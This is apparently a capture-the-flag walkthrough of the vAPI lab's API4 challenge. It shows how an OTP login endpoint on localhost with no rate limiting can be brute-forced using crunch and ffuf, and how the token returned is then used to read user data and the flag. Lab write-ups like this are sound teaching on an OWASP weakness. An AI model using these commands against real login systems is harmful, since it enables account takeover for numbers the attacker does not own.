> We believe OTPs are a great way of authenticating users and secure too if implemented correctly!

# Tools Used:
```
curl 8.8.0 (x86_64-pc-linux-gnu)
crunch version 3.6
ffuf 2.1.0-dev
cat (GNU coreutils) 9.4
```

# Mobile Login
## POST /vapi/api4/login

As the Postman Collection provided gave an example mobile number as "8000000535", we will be using that.
```json
...
						"body": {
							"mode": "raw",
							"raw": "{\r\n    \"mobileno\":\"8000000535\"\r\n}"
						},
...
```

Attempt to login using the mobile number used as an example in the Postman Collection provided.
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\x0d\x0a    \"mobileno\":\"8000000535\"\x0d\x0a}' \
    $'http://localhost/vapi/api4/login'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Wed, 26 Jun 2024 16:45:13 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Wed, 26 Jun 2024 16:45:13 GMT
Content-Type: application/json

{"success":"true","msg":"4 Digit OTP sent on mobile no."}
```

# Verify OTP
## POST /vapi/api4/otp/verify

Since we do not have the mobile number used, we will not be receiving the OTP. 
However, we still want to log in.

An example of a 403 response for providing the wrong OTP:
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\x0d\x0a    \"otp\":\"9999\"\x0d\x0a}' \
    $'http://localhost/vapi/api4/otp/verify'
```
```http
HTTP/1.1 403 Forbidden
Date: Wed, 26 Jun 2024 16:50:18 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Wed, 26 Jun 2024 16:50:18 GMT
Content-Type: application/json

{"success":"false","cause":"Invalid OTP"}
```

Lets brute force the OTP.

Create an OTP wordlist using crunch.
```bash
crunch 4 4 1234567890 -o /home/kali/Desktop/OTP.txt
```
```
Crunch will now generate the following amount of data: 50000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 10000 

crunch: 100% completed generating output
```

Brute force the OTP and save any matched HTTP response(s).
```bash
ffuf -w /home/kali/Desktop/OTP.txt -X POST -H "Content-Type: application/json" -d '{"otp": "§§"}' -u http://localhost/vapi/api4/otp/verify -fc 403 -mode sniper -od /home/kali/Desktop/ffuf_responses -v
```
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost/vapi/api4/otp/verify
 :: Wordlist         : FUZZ: /home/kali/Desktop/OTP.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"otp": "§§"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

[Status: 200, Size: 59, Words: 1, Lines: 1, Duration: 1791ms]
| URL | http://localhost/vapi/api4/otp/verify
| RES | 4e4e97da021366b653a445d25f762f0d
    * FUZZ: 1872

:: Progress: [10000/10000] :: Job [1/1] :: 22 req/sec :: Duration: [0:07:21] :: Errors: 0 ::
```
- Observe that there is no limit on how often we are able to call the API within a defined timeframe.
- Observe the OTP was found to be 1872 and the response is saved to "4e4e97da021366b653a445d25f762f0d".

View the matched fuff response file:
```bash
cat /home/kali/Desktop/ffuf_responses/4e4e97da021366b653a445d25f762f0d
```
```http
POST /vapi/api4/otp/verify HTTP/1.1
Host: localhost
User-Agent: Fuzz Faster U Fool v2.1.0-dev
Content-Length: 15
Content-Type: application/json
Accept-Encoding: gzip

{"otp": "1872"}
---- ↑ Request ---- Response ↓ ----

HTTP/1.1 200 OK
Connection: close
Cache-Control: no-cache, private
Content-Type: application/json
Date: Wed, 26 Jun 2024 17:30:21 GMT
Date: Wed, 26 Jun 2024 17:30:21 GMT
Host: localhost
X-Powered-By: PHP/7.4.33

{"success":"true","key":"FZvjaFlMgUfnpFJDhKx-92xeXx_sCr7Y"}
```
- Observe the request succeeded and the key is given in the response.

As specified in the Postman Collection, the test script to be executed for the API4 Verify OTP endpoint is used to derive the key (Authorization-Token) by parsing the JSON, selecting the value of "key" key and updates it in the Postman Environment as api4_key.
```js
var jsonData = JSON.parse(responseBody);
var api4_key = jsonData.key;
console.log("API 4 Key : "+api4_key);
postman.setEnvironmentVariable("api4_key",api4_key);
```

Manually derive the key from the 200 response.
```
FZvjaFlMgUfnpFJDhKx-92xeXx_sCr7Y
```
- We will need the Authorization Token for the "Get Details" endpoint

# Get Details
## GET /vapi/api4/user

Get details using the key we found.
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Authorization-Token: FZvjaFlMgUfnpFJDhKx-92xeXx_sCr7Y' -H $'Content-Type: application/json' -H $'Host: localhost' \
    $'http://localhost/vapi/api4/user'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Wed, 26 Jun 2024 17:45:59 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Wed, 26 Jun 2024 17:45:59 GMT
Content-Type: application/json

[{"id":1,"firstname":"john","lastname":"flag{api4_ce696239323ea5b2d015}"}]
```
- Observe we have acquired the details by brute forcing the OTP and getting the Authorization-Token using a mobile number that we do not own.

API4 Flag
```
flag{api4_ce696239323ea5b2d015}
```

References:
https://owasp.org/API-Security/editions/2019/en/0xa4-lack-of-resources-and-rate-limiting/
https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/